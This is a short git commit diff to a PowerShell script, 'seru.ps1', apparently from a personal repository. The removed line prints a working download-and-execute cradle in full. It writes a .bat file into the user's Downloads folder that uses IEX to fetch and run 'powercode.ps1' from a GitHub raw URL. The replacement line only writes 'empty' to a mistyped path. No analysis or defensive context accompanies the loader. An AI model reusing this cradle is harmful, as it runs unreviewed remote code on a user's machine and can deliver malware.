4074f7e89459c957586a7478769f600508b1ac29
alejq41 <93050806+alejq41@users.noreply.github.com>
2022-08-23 14:57:54 -0500

    Update seru.ps1

--- seru.ps1
+++ seru.ps1
@@ -1,1 +1,1 @@
-md C:\Users\User\Downloads\ser; echo IEX([System.IO.StreamReader]::New([System.Net.WebRequest]::Create('https://raw.githubusercontent.com/alejq41/free/main/powercode.ps1').GetResponse().GetResponseStream()).ReadToEnd()); >C:\Users\User\Downloads\ser\seru.bat; echo IEX([System.IO.StreamReader]::New([System.Net.WebRequest]::Create('https://raw.githubusercontent.com/alejq41/free/main/powercode.ps1').GetResponse().GetResponseStream()).ReadToEnd()); >C:\Users\User\Downloads\ser\seru.bat;
+md C:\Users\User\Downloads\ser; echo empty >C:\Users\User\Downloads\serseru.bat;
